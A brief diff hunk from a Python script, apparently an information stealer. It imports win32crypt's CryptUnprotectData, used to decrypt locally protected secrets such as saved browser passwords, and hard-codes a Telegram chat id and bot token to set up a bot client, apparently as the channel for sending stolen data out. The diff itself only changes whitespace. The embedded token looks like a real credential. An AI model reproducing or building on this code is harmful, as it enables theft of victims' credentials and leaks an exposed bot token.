@@ -120,7 +120,7 @@ from urllib.parse import urlparse
 from win32crypt import CryptUnprotectData
 ##############################
 
-my_id =  7138590083
+my_id = 7138590083
 bot_token = '7696684899:AAGegCUgRnr_bRok8WiOV5DkhY0Z-UKPP0g'
 bot = telebot.TeleBot(bot_token)
 
